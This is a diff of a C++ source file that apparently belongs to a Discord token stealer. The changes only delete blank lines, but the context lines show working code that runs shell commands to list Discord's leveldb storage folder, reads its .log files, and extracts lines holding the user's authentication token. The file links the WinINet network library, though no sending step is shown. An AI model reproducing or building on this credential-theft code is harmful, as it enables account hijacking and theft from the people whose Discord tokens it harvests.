@@ -7,10 +7,7 @@
 #include <Wininet.h>
 #pragma comment(lib, "wininet.lib")
 
-
 using namespace std;
-
-
 
 vector<string> split(const string& str, const string& delim) {
 	vector<string> keys;
@@ -85,9 +82,7 @@ int main() {
 	auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
 	for (auto file : files) {
 		if (file.find(".log") != string::npos) {
-			
 			auto lines = split(exec(string("cd %appdata%/discord/Local Storage/leveldb && more "+file).c_str()), "\n");
-			
 			for (auto line : lines) {
 				if (line.find("token") != string::npos) {
 					auto token = split(replace_all(line, "token>\"", ""), "\"")[0];
